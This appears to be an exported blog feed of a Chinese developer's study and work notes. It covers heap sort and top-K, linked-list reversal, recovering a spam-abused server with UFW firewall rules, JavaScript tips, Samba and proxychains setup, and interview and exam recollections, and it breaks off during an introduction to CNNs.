        <content type="html"><![CDATA[<h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><blockquote><p>给定一个数组，找出其中最小的 K 个数。例如数组元素是 4,5,1,6,2,7,3,8 这 8 个数字，则最小的 4 个数字是 1,2,3,4。如果 K &gt; 数组的长度，那么返回一个空的数组</p></blockquote><h2 id="复习-堆"><a href="#复习-堆" class="headerlink" title="复习 - 堆"></a>复习 - 堆</h2><p><a href="https://www.bilibili.com/video/BV1Eb41147dK" target="_blank" rel="noopener">详细图解参考 b 站视频</a></p><h3 id="什么是堆"><a href="#什么是堆" class="headerlink" title="什么是堆"></a>什么是堆</h3><ol><li>是完全二叉树<blockquote><p>完全二叉树：从上到下，从左到右添加节点</p></blockquote></li><li>每一颗子树的父节点大于子节点</li></ol><h3 id="堆的表示"><a href="#堆的表示" class="headerlink" title="堆的表示"></a>堆的表示</h3><p>使用一维数组即可。数组元素顺序就是层次遍历堆的结果。<br>由于是完全二叉树，所以可以由一个节点的数组索引，准确定位其直接父节点和直接子节点。</p><pre><code>假设从 0 开始索引为 i 的元素在堆中对应的直接父节点为：Math.floor((i - 1) / 2)左孩子为：2 * i + 1右孩子为：2 * i + 2</code></pre><h3 id="heapify"><a href="#heapify" class="headerlink" title="heapify"></a>heapify</h3><p>操作过程：从一个节点开始，将这个节点及其所有子节点构成的完全二叉树变为堆的过程。</p><blockquote><p>这个操作不用于整个完全二叉树完全打乱的状态。</p></blockquote><p>heapify 的实现：</p><pre><code>function heapify(arr, n, i) {    // n: 使用的 arr 长度, 从 0 开始    // i: 当前节点的索引位置    // arr: 一维数组表示的堆    // 递归的结束条件    if (i &gt;= n) {        return;    }    let max = i;    const left = 2 * i + 1;    const right = 2 * i + 2;    // 比较其左右节点与自身的三个值, 得到最大值    if (left &lt;= n &amp;&amp; arr[left] &gt; arr[max]) {        max = left;    }    if (right &lt;= n &amp;&amp; arr[right] &gt; arr[max]) {        max = right;    }    if (max !== i) {        swap(arr, i, max);        heapify(arr, n, max);    } else {        return  // max 就是 i 时不用解了, 退出    }}</code></pre><h3 id="构建堆"><a href="#构建堆" class="headerlink" title="构建堆"></a>构建堆</h3><p>用于将一整个完全打乱状态的完全二叉树变为堆。</p><p>从所有叶子节点的直接父节点开始，自底向上进行 heapify 操作。</p><p>整个完全二叉树的最后一个 / 两个叶子节点的父节点可以由上面的方法得到：</p><pre><code>Math.floor((n - 1) / 2)  // n 是数组最后元素下标。</code></pre><p>构建堆时，所有叶子节点的直接父节点就是依次减去 1. 直到为 0</p><p><img src="/images/post-images/1625106635696.png" alt=""></p><pre><code>function buildHeap(arr) {    // 需要借助 heapify 方法    let last = arr.length - 1;    last = Math.floor((last - 1) / 2);    while (last &gt;= 0) {        heapify(arr, arr.length - 1, last);        last -= 1;    }}</code></pre><h3 id="堆排序"><a href="#堆排序" class="headerlink" title="堆排序"></a>堆排序</h3><p>构建一个升序数组：<br>先构建堆，此时完全二叉树的根节点是整个数组的最大值，然后每次交换完全二叉树的根节点和完全二叉树的最后一个节点，然后忽略最后一个节点进行 heapify 操作，heapify 操作后完全二叉树的根节点成为了第二大值，依次类推，当只有一个数时，就是最小值了。。。</p><pre><code>function sortByHeap(arr) {    buildHeap(arr);    let n = arr.length - 1;    const sortedArr = [];    while (n &gt;= 0) {        sortedArr.push(arr[0]);        swap(arr, 0, n);        // 不用截断数组, 直接把 arr 长度 &quot;改掉&quot;        heapify(arr, n - 1, 0);        n -= 1;    }    return sortedArr;}</code></pre><h2 id="解法-1：直接排序"><a href="#解法-1：直接排序" class="headerlink" title="解法 1：直接排序"></a>解法 1：直接排序</h2><p>好家伙，直接排序 + 截取数组！</p><pre><code>function GetLeastNumbers_Solution(input, k){    // write code here    if (k &gt; input.length) {        return [];    }    let sortedArr = input.sort((a,b) =&gt; a-b);    return sortedArr.slice(0,k);}</code></pre><ul><li>时间复杂度：取决于 JavaScript 实现 sort 函数的方式，就算做 O(NlogN) 吧</li><li>空间复杂度：借助了辅助数组存储排序后的数组，明显是 O(N)</li></ul><p>估计面试这么写会让面试官感觉比较拉🤡</p><h2 id="解法-2：堆排序"><a href="#解法-2：堆排序" class="headerlink" title="解法 2：堆排序"></a>解法 2：堆排序</h2><p>注意题目是构建小根堆。</p><pre><code>function GetLeastNumbers_Solution(input, k) {    // write code here    if (k &gt; input.length) {        return [];    }    function swap(arr, i, j) {        const temp = arr[i];        arr[i] = arr[j];        arr[j] = temp;    }    // 从一个节点, 开始自上至下    function heapify(arr, n, i) {        // n: 使用的 arr 长度, 从 0 开始        // i: 当前节点的索引位置        // arr: 一维数组表示的堆        // 递归的结束条件        if (i &gt;= n) {            return;        }        let min = i;        const left = 2 * i + 1;        const right = 2 * i + 2;        // 比较其左右节点与自身的三个值, 得到最大值        if (left &lt;= n &amp;&amp; arr[left] &lt; arr[min]) {            min = left;        }        if (right &lt;= n &amp;&amp; arr[right] &lt; arr[min]) {            min = right;        }        if (min !== i) {            swap(arr, i, min);            heapify(arr, n, min);        } else {            return  // min 就是 i 时不用解了, 退出        }    }    function buildHeap(arr) {        // 需要借助 heapify 方法        let last = arr.length - 1;        last = Math.floor((last - 1) / 2);        while (last &gt;= 0) {            heapify(arr, arr.length - 1, last);            last -= 1;        }    }    // 前 k 个    function sortByHeap(arr, k) {        buildHeap(arr);        let n = arr.length - 1;        const sortedArr = [];        const stop = n - k;        while (n &gt; stop) {            sortedArr.push(arr[0]);            swap(arr, 0, n);            // 不用截断数组, 直接把 arr 长度 &quot;改掉&quot;            heapify(arr, n - 1, 0);            n -= 1;        }        return sortedArr;    }    // console.log(sortByHeap(input, k));    return sortByHeap(input, k);}// const arr = [7, 9, 11, 15, 17, 6, 13];// GetLeastNumbers_Solution(arr, 3)</code></pre>]]></content>
      
      
      <categories>
          
          <category> 算法笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>反转链表</title>
      <link href="2021/06/30/fan-zhuan-lian-biao/"/>
      <url>2021/06/30/fan-zhuan-lian-biao/</url>
      
        <content type="html"><![CDATA[<p>输入一个链表，反转链表后，输出新链表的表头。</p><a id="more"></a><p>从大一就开始学，学了忘，忘了学。。。<br>所有代码为 JavaScript 代码，牛客上运行通过。</p><h2 id="迭代"><a href="#迭代" class="headerlink" title="迭代"></a>迭代</h2><pre><code>function reverseList(Node head) {    let prev = null;    let curr = head;    while (curr) {        let next = curr.next;        curr.next = prev;        prev = curr;        curr = next;    }    return prev;}</code></pre><p><code>prev</code> 保存前一个节点（可以想象为虚的 val 无意义额定头结点，它的 next 指向链表第一个节点，这样好理解），<code>curr</code> 为当前要反转的节点，<code>next</code> 为后面的节点（下一次循环去反转的节点）。<br><img src="/images/post-images/1625055473869.png" alt=""><br>橙色和红色表示第一次，第二次循环。</p><ul><li>时间复杂度显然是链表长度 N</li><li>空间复杂度只用了两个额外的遍历，故为 O(1)</li></ul><h2 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h2><p>我可以看懂的伪递归：</p><pre><code>function ReverseList(head){    function reverse(prev, curr) {        if (curr === null) {            return prev;        }        let next = curr.next;        curr.next = prev;        return reverse(curr, next);    }    return reverse(null, head);}</code></pre><p>其实就是把迭代的变量用函数的参数保存了。所以说是 “伪递归”。<br>由于是在 return 中直接调用函数，所以是尾调用。<br>又因为尾调用函数是自身，所以是尾递归。。。</p><blockquote><p>调用及尾递归可以参考 <a href="http://www.ruanyifeng.com/blog/2015/04/tail-call.html" target="_blank" rel="noopener">阮一峰大佬的博客</a></p></blockquote><ul><li>时间复杂度：递归执行 N 次，故 O(N)</li><li>空间复杂度：递归执行 N 次，每次都要保存几个变量，O(mN)，m 为变量个数，故为 O(N)，尾递归优化后可能会降低空间复杂度。</li></ul><p>看不懂的递归：</p><pre><code>function ReverseList(head){    if (head === null || head.next === null) {        return head;    }    let p = ReverseList(head.next);    head.next.next = head;    head.next = null;    return p;}</code></pre><p>一段大佬的解释：</p><blockquote><p>关键就是理解 <code>p</code> 是反转后链表的表头，也就是原链表的最后一个节点。注意到从第一行的语句返回 <code>head</code> 之后，在以后的函数出栈过程中返回值 <code>p</code> 一直没有变，只是将当前函数的输入结点进行反转，就可以理解这个递归的过程了。</p></blockquote><p>一个运行过程模拟图：<br><img src="/images/post-images/1625057322087.png" alt=""><br>为什么 <code>head === null || head.next === null</code> 而不是只写一个判断 <code>head === null</code> 或者 <code>head.next === null</code>???</p>]]></content>
      
      
      <categories>
          
          <category> 算法笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>服务器被黑😡</title>
      <link href="2021/06/29/fu-wu-qi-bei-hei/"/>
      <url>2021/06/29/fu-wu-qi-bei-hei/</url>
      
        <content type="html"><![CDATA[<p>服务突然不能用了，以为是应用服务挂了，登上服务器提供商发现服务器被黑了，报告说是被用来滥发大量垃圾邮件。。。被自动暂停运行了。。。</p><a id="more"></a><p>被黑的服务器情况：<br>我就装了一个服务，是 Github 那种开源的一键脚本，有两三千的 star 那种。具体哪个就不说了，因为我也没有审查过脚本。不能下确切的结论。<br>被黑的系统是 Debian 10，安装后没有配置任何防火墙，网络设置。</p><p>出现这个问题要么就是真的被黑了，要么就是我装的那个 Github 上的脚本有后门或漏洞。。。<br>没办法，按照提示重装系统，禁用密码登陆，使用密钥登陆看看。<br>自己写服务脚本是不可能的，换个更高 star 的一键脚本试试。。<br>后面如果再次被黑的话再来更新。。。</p><p>CTMD，重装了 CentOS 7 ，关闭密码登陆，几十分钟后再次被黑了，🤬，还是被用来发送垃圾邮件。。。</p><p>再次重载系统，这次用了 Debian 9。<br>搜了一下，有人和我一样，被黑用来发邮件。<br>有人评论说把邮件 SMTP 默认端口关了。</p><p>关键是我用的是密钥登陆，黑客怎么登陆的？还是说这个系统只要安装就会默认存在这个直接可以利用的邮件发送漏洞？<br>算了，不管漏洞怎么来的，干脆直接把端口禁掉，再禁用密码登陆，于是装了一个用起来比较简单的防火墙管理端口。<br><a href="https://linuxize.com/post/how-to-setup-a-firewall-with-ufw-on-debian-9/" target="_blank" rel="noopener">UFW 防火墙的基本使用</a>。</p><h2 id="UFW-防火墙的增删改查："><a href="#UFW-防火墙的增删改查：" class="headerlink" title="UFW 防火墙的增删改查："></a>UFW 防火墙的增删改查：</h2><ol><li>增加规则：</li></ol><ul><li>允许规则<pre><code>  ufw allow 8822/tcp</code></pre></li><li>不在允许之列的都是被禁止的.</li><li>可以明确禁止邮件的 25 端口！<pre><code>  ufw deny 25/tcp  ufw deny 25/udp</code></pre></li></ul><ol start="2"><li>查看规则：<pre><code>ufw status numbered</code></pre></li><li>删除规则：<br>数字就是查看规则的返回的数据的前面的标号<pre><code>ufw delete 3</code></pre><h2 id="别把自己拦在外面"><a href="#别把自己拦在外面" class="headerlink" title="别把自己拦在外面"></a>别把自己拦在外面</h2>添加规则首先就要把你的 SSH 端口加上！！！<h2 id="启用-UFW"><a href="#启用-UFW" class="headerlink" title="启用 UFW"></a>启用 UFW</h2><pre><code>ufw enable</code></pre>返回状态是 <code>active</code> 就是激活了~</li></ol><p>希望黑客大佬放过我的小主机吧😒<br>再搞几次的话服务器就被永久封了。。。</p><p>wdnmd，端口都禁了还能被黑？算了，就一直暂停算了。我是无能为力了。</p><h2 id="找到问题所在了"><a href="#找到问题所在了" class="headerlink" title="找到问题所在了"></a>找到问题所在了</h2><p>首先，在笔记本上用没问题，一晚上也没有再次出现滥发邮件情况，无法复现。<br>在台式机上，软件的信息栏里，明显有大量的 smtp 转发流量，并且大部分来自远程 <code>tcp:89.38.99.134</code> 的转发，想了一下，再结合昨天有人提到，可能时本地软件遭到入侵，而且平时都是本地 <code>tcp:127.0.0.1</code> 的转发。<br>所以，问题来自一系列的巧合：我开启了软件的 “允许来自局域网的连接”，并且前几天正巧处于某个需要，台式机连接的路由器开了 <code>端口转发与 UPDP</code>，而且软件监听使用的是默认端口 1080，这一切导致被黑客扫到的概率增加，我还一度以为本地台式机器被黑了，还下载了卡巴斯基。。。</p>]]></content>
      
      
      <categories>
          
          <category> 备忘录 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>遇到的 ES 问题</title>
      <link href="2021/06/28/yu-dao-de-es-wen-ti/"/>
      <url>2021/06/28/yu-dao-de-es-wen-ti/</url>
      
        <content type="html"><![CDATA[<h1 id="1-解构赋值中的函数参数默认值"><a href="#1-解构赋值中的函数参数默认值" class="headerlink" title="1. 解构赋值中的函数参数默认值"></a>1. 解构赋值中的函数参数默认值</h1><pre><code>function draw({size = &#39;big&#39;, cords = { x: 0, y: 0}, radius = 25}){  console.log(size, cords, radius);  // do some chart drawing}draw({  cords: { x: 18, y: 30 },  radius: 30});draw(); // TypeError: Cannot read property &#39;size&#39; of undefined</code></pre><p>传递的实参没有 size 参数，就会使用默认值，但是，如果不用任何参数，会报错！</p><p>在解构表达式的右边，加上 <code>={}</code> 就可以解决。</p><pre><code>function draw({size = &#39;big&#39;, cords = { x: 0, y: 0 }, radius = 25} = {})draw();  // 打印 big { x: 0, y: 0 } 25</code></pre><h1 id="2-二维数组初始化与-Array-from-方法"><a href="#2-二维数组初始化与-Array-from-方法" class="headerlink" title="2. 二维数组初始化与 Array.from 方法"></a>2. 二维数组初始化与 Array.from 方法</h1><p><a href="https://segmentfault.com/q/1010000011425373/a-1020000011425478" target="_blank" rel="noopener">来自 segmentfault 社区</a></p><p>初始化为全 0 的二维数组</p><pre><code>let arr = Array.from(Array(3)).map(() =&gt; Array(3).fill(0))</code></pre><p>或者</p><pre><code>let arr = [...Array(3)].map(() =&gt; Array(3).fill(0))</code></pre><p>引申：</p><blockquote><p>《JS 高级程序设计 4 版》中的 6.2.1：<br><img src="post-images/1624887623160.png" alt=""><br>分割字符串创建数组不用这么写：</p></blockquote><pre><code>let theArr = theStr.split(&quot;&quot;);</code></pre><p>有了 from，可以这么写：</p><pre><code>let theArr = Array.from(theStr);</code></pre><p>虽然 from 是浅复制，但是对于基本类型来说也足够了。</p>]]></content>
      
      
      <categories>
          
          <category> 日常编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows10 通过 Samba 连接树莓派的正确姿势</title>
      <link href="2021/06/08/Windows10%E9%80%9A%E8%BF%87Samba%E8%BF%9E%E6%8E%A5%E6%A0%91%E8%8E%93%E6%B4%BE%E7%9A%84%E6%AD%A3%E7%A1%AE%E5%A7%BF%E5%8A%BF/"/>
      <url>2021/06/08/Windows10%E9%80%9A%E8%BF%87Samba%E8%BF%9E%E6%8E%A5%E6%A0%91%E8%8E%93%E6%B4%BE%E7%9A%84%E6%AD%A3%E7%A1%AE%E5%A7%BF%E5%8A%BF/</url>
      
        <content type="html"><![CDATA[<h2 id="吐槽"><a href="#吐槽" class="headerlink" title="吐槽"></a>吐槽</h2><p>今天搜了一下午，要么说去 win10 的程序与功能那里打开什么服务的，要么说要打开什么组策略的，要开启什么什么服务的，全是 TM 扯淡。。。</p><p>在没有开启 SMB1.0 支持，没有修改组策略的情况下，</p><p>按照 <a href="https://pimylifeup.com/raspberry-pi-samba/" target="_blank" rel="noopener">这篇博客</a> 写的步骤很容易就成功了。。。</p><p>成功后的一些截图：</p><p>程序与功能没有打开 SMB：</p><p><img src="/images/Windows10%E9%80%9A%E8%BF%87Samba%E8%BF%9E%E6%8E%A5%E6%A0%91%E8%8E%93%E6%B4%BE%E7%9A%84%E6%AD%A3%E7%A1%AE%E5%A7%BF%E5%8A%BF/image-20210608215548461.png" alt="程序与功能没有打开 SMB"></p><p>操作系统版本也是比较新的版本：</p><p><img src="/images/Windows10%E9%80%9A%E8%BF%87Samba%E8%BF%9E%E6%8E%A5%E6%A0%91%E8%8E%93%E6%B4%BE%E7%9A%84%E6%AD%A3%E7%A1%AE%E5%A7%BF%E5%8A%BF/image-20210608220315204.png" alt="image-20210608220315204"></p><p>而且文件管理器的网络选项内并没有出现树莓派：</p><p><img src="/images/Windows10%E9%80%9A%E8%BF%87Samba%E8%BF%9E%E6%8E%A5%E6%A0%91%E8%8E%93%E6%B4%BE%E7%9A%84%E6%AD%A3%E7%A1%AE%E5%A7%BF%E5%8A%BF/image-20210608220326589.png" alt="image-20210608220326589"></p><h2 id="关键步骤"><a href="#关键步骤" class="headerlink" title="关键步骤"></a>关键步骤</h2><p>关键是，要在 Win10 的这样设置！不要管什么网络，网络邻居啥的！</p><p><img src="/images/Windows10%E9%80%9A%E8%BF%87Samba%E8%BF%9E%E6%8E%A5%E6%A0%91%E8%8E%93%E6%B4%BE%E7%9A%84%E6%AD%A3%E7%A1%AE%E5%A7%BF%E5%8A%BF/image-20210608220339787.png" alt="image-20210608220339787"></p><ol><li>点击后，弹出对话框：</li></ol><p><img src="/images/Windows10%E9%80%9A%E8%BF%87Samba%E8%BF%9E%E6%8E%A5%E6%A0%91%E8%8E%93%E6%B4%BE%E7%9A%84%E6%AD%A3%E7%A1%AE%E5%A7%BF%E5%8A%BF/image-20210608220351431.png" alt="image-20210608220351431"></p><ol start="2"><li>上面的 <code>你自定义的</code> 就是你在 <code>/etc/samba/smb.conf</code> 文件里写的几行中的首行：</li></ol><p><img src="/images/Windows10%E9%80%9A%E8%BF%87Samba%E8%BF%9E%E6%8E%A5%E6%A0%91%E8%8E%93%E6%B4%BE%E7%9A%84%E6%AD%A3%E7%A1%AE%E5%A7%BF%E5%8A%BF/image-20210608220410162.png" alt="image-20210608220410162"></p><ol start="3"><li>点击完成，需要你输入用户名密码，就是</li></ol><pre><code class="shell">sudo smbpasswd -a 用户名</code></pre><p>对应的用户名密码。</p><ol start="4"><li>然后，你会发现此电脑那里多了一个网络位置！</li></ol><p><img src="/images/Windows10%E9%80%9A%E8%BF%87Samba%E8%BF%9E%E6%8E%A5%E6%A0%91%E8%8E%93%E6%B4%BE%E7%9A%84%E6%AD%A3%E7%A1%AE%E5%A7%BF%E5%8A%BF/image-20210608220501299.png" alt="image-20210608220501299"></p><ol start="5"><li>完成 samba 共享树莓派文件！</li></ol>]]></content>
      
      
      <categories>
          
          <category> 备忘录 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>更方便直观地查看文件大小的 Linux 命令</title>
      <link href="2021/06/08/%E6%9B%B4%E6%96%B9%E4%BE%BF%E7%9B%B4%E8%A7%82%E5%9C%B0%E6%9F%A5%E7%9C%8B%E6%96%87%E4%BB%B6%E5%A4%A7%E5%B0%8F%E7%9A%84Linux%E5%91%BD%E4%BB%A4%E7%9A%84%E6%AD%A3%E7%A1%AE%E5%A7%BF%E5%8A%BF/"/>
      <url>2021/06/08/%E6%9B%B4%E6%96%B9%E4%BE%BF%E7%9B%B4%E8%A7%82%E5%9C%B0%E6%9F%A5%E7%9C%8B%E6%96%87%E4%BB%B6%E5%A4%A7%E5%B0%8F%E7%9A%84Linux%E5%91%BD%E4%BB%A4%E7%9A%84%E6%AD%A3%E7%A1%AE%E5%A7%BF%E5%8A%BF/</url>
      
        <content type="html"><![CDATA[<p>平时，用 <code>du</code>，<code>df</code>，<code>tree</code>，查看磁盘里文件大小，不能交互，用起来总感觉少了点什么。</p><p>今天发现了 <code>ncdu</code>，可以使用方向键交互，查看每个文件的大小。爽！</p><p><img src="/images/%E6%9B%B4%E6%96%B9%E4%BE%BF%E7%9B%B4%E8%A7%82%E5%9C%B0%E6%9F%A5%E7%9C%8B%E6%96%87%E4%BB%B6%E5%A4%A7%E5%B0%8F%E7%9A%84Linux%E5%91%BD%E4%BB%A4%E7%9A%84%E6%AD%A3%E7%A1%AE%E5%A7%BF%E5%8A%BF/image-20210608220236266.png" alt="image-20210608220236266"></p>]]></content>
      
      
      <categories>
          
          <category> 日常编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安恒 2022 技术 C 笔试</title>
      <link href="2021/06/03/%E5%AE%89%E6%81%922022%E6%8A%80%E6%9C%AFC%E7%AC%94%E8%AF%95/"/>
      <url>2021/06/03/%E5%AE%89%E6%81%922022%E6%8A%80%E6%9C%AFC%E7%AC%94%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<ol><li>简答题的最后一题（20 分）</li></ol><blockquote><p>简述黑客的攻击路径。</p></blockquote><p>我当时写的大概是：</p><ol><li>攻击系统应用软件，端口扫描发现软件漏洞</li><li>破解密码</li><li>钓鱼网站，邮件骗取用户的个人信息</li><li>恶意软件，诱导用户运行，获取用户系统权限</li></ol><p>刚才去网上找了找，发现写的还挺全：</p><p><a href="http://sxdofcom.shaanxi.gov.cn/newstyle/pub_newsshow.asp?id=29034582&chid=100520" target="_blank" rel="noopener">黑客攻击主要手段和方法</a></p><hr><ol start="2"><li>（多选题的其中一道）</li></ol><blockquote><p>OWASP Top 10 有哪些。</p></blockquote><p>当时瞎蒙的。。。</p><p>刚才去网上找了找</p><p><a href="https://owasp.org/www-project-top-ten/" target="_blank" rel="noopener">OWASP Top Ten Web Application Security Risks</a></p><p>依次为：</p><ol><li>注入</li><li>Broken Authentication / 破解验证？</li><li>敏感数据公开</li><li>XML 外部实体</li><li>破解访问控制</li><li>错误的安全配置</li><li>XSS / 跨站脚本</li><li>不安全的反序列化</li><li>利用了已有漏洞的组件</li><li>日志记录和监控的不够</li></ol><blockquote><p>OWASP 是什么</p><p>OWASP 是 Open Web Application Security Project 的缩写，这是一个在线社区，在 Web 应用安全领域发布文章、方法、文档、工具和技术。</p><p>Top 10 每三到四年更新一次，最新的 OWASP 漏洞列表在 2017 年发布。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 笔试记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 终端下按需科学上网</title>
      <link href="2021/05/31/Linux%E7%BB%88%E7%AB%AF%E4%B8%8B%E6%8C%89%E9%9C%80%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91%E7%9A%84%E6%AD%A3%E7%A1%AE%E5%A7%BF%E5%8A%BF/"/>
      <url>2021/05/31/Linux%E7%BB%88%E7%AB%AF%E4%B8%8B%E6%8C%89%E9%9C%80%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91%E7%9A%84%E6%AD%A3%E7%A1%AE%E5%A7%BF%E5%8A%BF/</url>
      
        <content type="html"><![CDATA[<h3 id="proxychains-方案"><a href="#proxychains-方案" class="headerlink" title="proxychains 方案"></a><code>proxychains</code> 方案</h3><p>前提当然是你已经配置好了 <code>v2ray</code> 的 <code>socks5</code> 代理。。。</p><p>需要连外网的命令比较少，此方案可以通过前缀加一个命令让所有软件都走代理。</p><p><a href="https://v2raytech.com/linux-cmd-set-proxy/" target="_blank" rel="noopener">此方案来自这里</a></p><blockquote><p>我用的这个 V2 的安装脚本：<code>https://github.com/v2fly/fhs-install-v2ray</code></p></blockquote><p>首先安装 <code>proxychains</code></p><p>然后编辑 <code>/etc/proxychains.conf</code> 文件，在最后的 <code>**[ProxyList]**</code> 一节中增加代理设置，例如：</p><pre><code>socks5 127.0.0.1 1080</code></pre><p>** 注意 **，这时要把 <code>socks4</code> 哪一行注释掉，不然，由于 <code>v2ray</code> 没有设置 <code>socks4</code>，会报错。</p><p>接下来，所有希望走代理的命令，前面增加 <code>proxychains</code> 即可，例如：</p><pre><code>proxychains wget https://www.google.com</code></pre><p>那些不直接支持 <code>socks5</code> 代理的软件应该都可以用了，因为</p><blockquote><p> 根据 [OSI 模型](<a href="https://zh.wikipedia.org/wiki/OSI" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/OSI</a> 模型)，SOCKS 是[会话层](<a href="https://zh.wikipedia.org/wiki" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki</a> / 会话层) 的协议，位于 [表示层](<a href="https://zh.wikipedia.org/wiki" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki</a> / 表示层) 与[传输层](<a href="https://zh.wikipedia.org/wiki" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki</a> / 传输层)之间。</p></blockquote><p>众所周知，HTTP 是应用层协议。</p>]]></content>
      
      
      <categories>
          
          <category> 日常编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>腾讯音乐娱乐测开笔试</title>
      <link href="2021/04/15/%E8%85%BE%E8%AE%AF%E9%9F%B3%E4%B9%90%E5%A8%B1%E4%B9%90%E6%B5%8B%E5%BC%80%E7%AC%94%E8%AF%95/"/>
      <url>2021/04/15/%E8%85%BE%E8%AE%AF%E9%9F%B3%E4%B9%90%E5%A8%B1%E4%B9%90%E6%B5%8B%E5%BC%80%E7%AC%94%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<p>第一题做全了，第二题 45%，一直改，做到最后二十分钟竟然变为了 15%。。。第三题直接弃了。</p><h1 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h1><ul><li>输入一个整数 <code>n</code>，表示输入的整数数组数。输入这些数组。</li><li>输出每个数组内不重复的整数的最小值。意即最小数不得在数组内重复。</li></ul><pre><code>输入210 10 30 30 2099 98 98 输出2099</code></pre><h1 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h1><p>“最小代价”</p><p>先输入一个正整数，表示后面的数组的长度。</p><p>再输入两个等长数组，两个数组内包含整数。</p><p>第二个数组对应的位置表示第一个数组内此位置的数 <code>+1</code> 需要的代价。</p><p>求使得第一个数组内各个数不同的最小代价。</p><pre><code>输入31 1 24 5 3输出7</code></pre><blockquote><p><code>1 1 2</code> 第一个元素加一，变为 <code>2 1</code>2，第三个元素再加一，变为 <code>2 1</code>3，此时代价为 <code>7</code>， 即最小代价</p></blockquote><h1 id="第三题"><a href="#第三题" class="headerlink" title="第三题"></a>第三题</h1><p>好像和最短路径相关。。。</p>]]></content>
      
      
      <categories>
          
          <category> 笔试记录 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>靠谱的公司（技术胖）</title>
      <link href="2020/03/15/%E6%89%BE%E5%88%B0%E9%9D%A0%E8%B0%B1%E7%9A%84%E5%88%9D%E5%88%9B%E5%85%AC%E5%8F%B8%EF%BC%88b%E7%AB%99%E6%8A%80%E6%9C%AF%E8%83%96%EF%BC%89/"/>
      <url>2020/03/15/%E6%89%BE%E5%88%B0%E9%9D%A0%E8%B0%B1%E7%9A%84%E5%88%9D%E5%88%9B%E5%85%AC%E5%8F%B8%EF%BC%88b%E7%AB%99%E6%8A%80%E6%9C%AF%E8%83%96%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>对于创业公司，面试前问清楚：</p><ul><li>面试前要对公司有一定的了解,  融资情况，CEO 背景，投资人背景，红色资本（国家注资）</li><li>盈利能力</li><li>政策风险，有无法律擦边球</li><li>技术发展</li></ul><p>面试通知后，面试中：</p><ul><li>问，自己进公司后去哪条产品线，哪个部门</li><li>技术可以带来更多价值的部门</li><li>技术是否与岗位对口</li><li>有没有人带，没有人带可能就是个大坑，因为上一届都干不下去了</li><li>问清除薪资，基本的，年终的，季度奖金，有无技术评级，<code>五险一金缴纳基数，高基数可以给自己减少房贷压力</code></li><li>下午茶陷阱，不要看得太重，不要用下午茶换薪资</li><li><code>期权</code>，上市的给的是股票，未上市的可能会给你期权，类似期房。<ul><li>注意：1 <code>期权发放比例</code>，例如你有 1 万股期权，公司总共发了 10 亿股，那你的那份就没多大价值</li><li>注意：2 <code>期权转现期限</code>，一般公司是 3，4 年之内，七八年之类的都在画大饼！！！</li><li>注意：3 <code>离职期权问题</code>，离职是否期权作废，或者强制以极低价格回收</li><li>注意：4 当前期权的 <code>公允价</code></li></ul></li></ul><p>面试通过，拿到 offer 后：</p><ul><li>及时给公司回复，避免公司面试其他人后选择别人。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 备忘录 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CNN 简述</title>
      <link href="2020/01/30/CNN%E7%AE%80%E8%BF%B0/"/>
      <url>2020/01/30/CNN%E7%AE%80%E8%BF%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="Convolution"><a href="#Convolution" class="headerlink" title="Convolution"></a>Convolution</h1><p>CNN 也是 ANN 的一种，特点是它可以发现 pattern。</p><p>CNN 不光有基本的网络层，还有更重要的卷积层。</p><p>卷积层对数据的变换操作称为 convolution operation。</p><p>在数学上，由卷积层执行的卷积运算称为互相关 <code>cross-correlations</code>。</p><h2 id="卷积层的操作"><a href="#卷积层的操作" class="headerlink" title="卷积层的操作"></a>卷积层的操作</h2><ol><li><p>开始阶段，通过 filter 进行 pattern 发现。</p><blockquote><p>patterns</p><p>在一个图形中，pattern 可以是形状，材质 textures，物体 objects。</p><p>一个可以发现形状的 filter 可以称为 <code>edge detector</code></p></blockquote></li><li><p>往后，filter 更复杂，不是简单的边缘和多边形，而是发现特殊的物体，例如眼睛，耳朵，头发，羽毛等。</p></li><li><p>更深的网络层可以发现更复杂的物体，例如狗，鸟等。</p></li></ol><h4 id="通过例子看一下操作"><a href="#通过例子看一下操作" class="headerlink" title="通过例子看一下操作"></a>通过例子看一下操作</h4><p>手写数字识别</p><p><img src="/images/image-20200130175239314.png" alt="手写数字"></p><p>假设第一个层就是卷积层，这时需要指定 filter 的数量，</p><blockquote><p>filter 的数量决定了输出 channel 的数量。</p></blockquote><p>从技术上讲，filter 可以认为是一个相对较小的矩阵（张量），为此，我们需要决定该矩阵具有的行数和列数，并使用随机数初始化该矩阵中的值。</p><h4 id="卷积层"><a href="#卷积层" class="headerlink" title="卷积层"></a>卷积层</h4><p><img src="/images/same_padding_no_strides.gif" alt="filter"></p><p><a href="https://deeplizard.com/learn/video/YRhxdVk_sIs" 